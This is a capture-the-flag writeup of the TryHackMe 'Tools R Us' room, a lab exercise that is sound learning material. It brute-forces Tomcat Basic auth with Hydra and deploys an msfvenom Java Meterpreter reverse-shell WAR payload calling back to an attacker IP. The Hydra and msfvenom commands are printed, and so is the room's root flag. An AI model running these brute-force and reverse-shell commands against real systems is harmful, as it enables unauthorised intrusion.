---
title: Tools R Us (Try Hack Me)
author: Robin Goyal
date: 2021-09-08 21:30 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/77fd9d1804d33b5cf3adf1a2f3dcc34b.jpeg
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Enumeration

First things first, let's begin with an nmap scan of the target of the top 1000 common ports.

![nmap results](/assets/img/posts/thm-toolsrus/nmap.jpg)

From an initial assessment, the target is an Ubuntu OS as specified in the version information for a few of the services. There are 4 ports open:
- 22 (SSH)
- 80 (HTTP)
- 1234 (HTTP)
- 8009 (AJP13)

### 80 (HTTP)

The landing page does not provide much information but it states that other parts of the website are still functional.

![80 landing page](/assets/img/posts/thm-toolsrus/80-landing.jpg)

With no details in the source code and no robots.txt file present, let's move on to our favorite web application enumerate, directory busting!

![80 gobuster](/assets/img/posts/thm-toolsrus/80-gobuster.jpg)

Running gobuster with the common.txt wordlist as part of the seclists repository, we have a few hits!

The two interesting endpoints in the results are /guidelines and /protected. /protected is protected (haha) by HTTP Basic authentication and with no credentials, there's not much other than brute force authentication. However, the /guidelines endpoint contains some information that we could potentially use to our advantage.

![80 guidelines](/assets/img/posts/thm-toolsrus/80-guidelines.jpg)

There may be a chance that the Apache Tomcat server running on port 1234 might be outdated and exploitable. Let's find out!

### 1234 (HTTP)

![1234 landing page](/assets/img/posts/thm-toolsrus/1234-landing.jpg)

This is the default page for the Apache Tomcat server. Through previous experience with exploiting this specific Apache service, one vector was to upload a WAR reverse shell payload to the Manager App section. Administrative access required credentials but this was usually a default set of credentials which may be the case here as well.

![1234 login attempt](/assets/img/posts/thm-toolsrus/1234-login-attempt.jpg)

I captured the HTTP Basic authentication request to the /manager/html endpoint (Manager App panel) in Burpsuite and used a default Tomcat credential list [^tomcat-default-creds] with the Intruder feature. However, none of the default credential combinations provided us access. Burpsuite also throttles the Intruder attack so using larger username and password lists would result in a slow attack. Instead, we can use Hydra's http-get module to perform the brute force authentication attack [^hydra].

*I banged my head on obtaining access to the Tomcat Manager and the /protected endpoint of the web application at port 80. I spent an hour only to realize a massive oversight on my part. I'll provide a brief summary of what I accomplished.*

#### Bonehead Move

I modified the example Hydra command from the reference provided above;
`hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -s 1234 10.10.80.207 http-get /manager/html`
with no successful username and password combination. It took a few minutes but it clicked that in the /guidelines endpoint, the note was left for "bob". Removing the option for a username list, I selected the username "bob" for the command but that also returned no results.

I then pivoted to use the same command for the /protected endpoint and Hydra reported a pair of successful credentials using the same username and password list.

![80 protected hydra](/assets/img/posts/thm-toolsrus/80-protected-hydra.jpg)

Checking out the page at /protected

![80 protected landing](/assets/img/posts/thm-toolsrus/80-protected-landing.jpg)

Okay! Looks like that page has moved to another endpoint. This must be the protected Manager App admin panel from the Apache Tomcat application. Trying out the creds `bob:bubbles` for the Tomcat application failed.

*I fumbled for a while searching for other vulnerabilities for the Apache Tomcat and the Apache JServ service at port 8009. The combination of Tomcat and JServ is open to the Ghostcat vulnerability but it didn't seem like this was the intended route.*

*After some time, I decided to try the credentials again for the Manager App and it worked! I couldn't believe it. Thinking that the application bugged out and let me in unintentionally (weird though but I was confused), I tried the hydra command again. Unfortunately, Hydra returned no results. I opened up an incognito window, tried the creds again, and it rejected the credentials. At this point, I did not understand how I successfully authenticated once but failed afterwards.*

*So far, I had spent an hour searching for other ports through a full nmap scan, researched other vulnerabilities, performed more directory enumeration, but nothing was working. I stepped away from the computer, took a break, and within five minutes, it hit me. Apache Tomcat will lock the user out of their account after some number of authentication attempts for a specific amount of time. What must have happened when I successfully logged in and thought the application had bugged out was that the account must have become unlocked after some amount of time. The subsequent hydra attempt must have then locked me out again.*

With that out of the way, let's login to the Tomcat Application Manager.

![1234 manager app](/assets/img/posts/thm-toolsrus/1234-login-manager.jpg)

## Initial Foothold

With authenticated access to the Web Application Manager for Apache Tomcat, we can deploy a WAR package which can generate a reverse shell to our attacker system.

Instead of using the Metasploit module which will do all of the work for us, let's try to exploit this manually just for some practice generating payloads [^tomcat-exploit].

We can generate a WAR payload with the following command:

`msfvenom -p java/meterpreter/reverse_tcp LHOST=10.6.5.103 LPORT=4444 -f war > shell.war`
- `-p java/meterpreter/reverse_tcp`: Staged Meterpreter payload
- `LHOST=10.6.5.103 LPORT=444`: IP/port combination for the reverse shell
- `-f war`: Output in a WAR file format

Once we deploy the WAR file through the Application Manager GUI, we can see and browse to /shell under the list of Applications.

![1234 war upload](/assets/img/posts/thm-toolsrus/1234-war-upload.jpg)

Since we are using a staged Meterpreter payload, we'll need to configure the handler module in Metasploit to send the stager payload which will generate a Meterpreter shell for us.

*I did try to use a shell reverse tcp payload but when the reverse connection occurred, the Java application would error out with an OutOfMemoryError.*

We'll configure the handler module with the accept parameters that we used to create the WAR payload. Once configured and running, we can click on /shell and see our second stage Meterpreter payload sent and a session opened up!

![1234 metasploit handler](/assets/img/posts/thm-toolsrus/1234-metasploit-handler.jpg)

Even better is that we have access to the system as root so privilege escalation isn't even required!

This room only has a root flag and it is located at /root.

Root Flag: `ff1fc4a81affcc7688cf89ae7dc6e0e1`

And with that, we have completed the room!

## Useful Commands

### Hydra Basic Authentication

I may have covered this in a previous writeup but to brute force HTTP Basic Authentication using Hydra:

`hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -s 1234 10.10.80.207 http-get /manager/html`

- `-L users.txt`: username list
- `-P darkweb2017-top1000.txt`: password list
- `-s 1234`: different port other than port 80
- `10.10.80.207`: target
- `http-get`: module to use with hydra
- `/manager/html`: module parameter which is a path

### Msfvenom Java WAR Payload

This is copied exactly as described above but kept down here for future referencing.

`msfvenom -p java/meterpreter/reverse_tcp LHOST=10.6.5.103 LPORT=4444 -f war > shell.war`
- `-p java/meterpreter/reverse_tcp`: Staged Meterpreter payload
- `LHOST=10.6.5.103 LPORT=444`: IP/port combination for the reverse shell
- `-f war`: Output in a WAR file format

## Reflection

This must be my third time exploiting an Apache Tomcat service within an intentionally vulnerable machine but the miniscule fact that accounts can be locked out evaded me this time. For this room, despite not learning any new techniques, I learned that taking a step away from the keyboard can lead to new insights (or old ones that slipped your mind).

For a straight path from enumeration to exploitation, this room does not have many steps to it. There is no privilege escalation as the Apache Tomcat service is run by the root user. However, the experience with generating payloads using msfvenom and catching staged payloads with metasploit's handler module make this room an interesting challenge.

## References

[^tomcat-default-creds]: <https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown>
[^hydra]: <https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#bruteforce>
[^tomcat-exploit]: <https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/>
